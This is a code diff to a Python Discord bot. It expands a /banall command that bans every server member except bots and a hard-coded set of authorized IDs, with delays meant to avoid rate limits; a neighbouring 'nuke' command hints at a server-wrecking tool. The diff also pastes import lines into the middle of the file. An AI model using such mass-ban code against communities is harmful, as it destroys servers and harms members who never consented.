@@ -155,40 +155,64 @@ async def nuke(interaction: Interaction):
 # ---------------------------
 # /BANALL COMMAND
 # ---------------------------
+import asyncio
+import nextcord
+from nextcord.ext import commands
+
+AUTHORIZED_USERS = {1234567890}
+
 @bot.slash_command(
     name="banall",
-    description="Ban all server members (except you and authorized users)."
+    description="Ban all server members (except authorized users & bots)."
 )
 async def banall(interaction: nextcord.Interaction):
 
-    # Authorization check
     if interaction.user.id not in AUTHORIZED_USERS:
         await interaction.response.send_message(
-            "You are not allowed to use this command.", ephemeral=True
+            "❌ You are not allowed to use this command.",
+            ephemeral=True
         )
         return
 
-    # Prevent timeout
+    guild = interaction.guild
+    if not guild:
+        await interaction.response.send_message(
+            "❌ This command can only be used in a server.",
+            ephemeral=True
+        )
+        return
+
+    if not guild.me.guild_permissions.ban_members:
+        await interaction.response.send_message(
+            "❌ I do not have permission to ban members.",
+            ephemeral=True
+        )
+        return
+
     await interaction.response.defer(ephemeral=True)
 
-    guild = interaction.guild
     failed = 0
+    banned = 0
 
-    for member in guild.members:
-        if member.id in AUTHORIZED_USERS or member.bot:
+    for member in list(guild.members):
+        if member.bot or member.id in AUTHORIZED_USERS:
             continue
+
         try:
             await member.ban(reason="Mass ban command used.")
-            await asyncio.sleep(1)  # rate-limit protection
+            banned += 1
+            await asyncio.sleep(1.2)  # safer delay
         except Exception as e:
             failed += 1
-            print(f"Failed to ban {member}: {e}")
+            print(f"Failed to ban {member} ({member.id}): {e}")
 
     await interaction.followup.send(
-        f"✅ Mass ban complete. Failed: {failed}", ephemeral=True
+        f"✅ Mass ban complete.\n"
+        f"🔨 Banned: {banned}\n"
+        f"⚠️ Failed: {failed}",
+        ephemeral=True
     )
-
-# ----------------------
+    
 # RUN BOT
 # ----------------------
 bot.run(TOKEN)
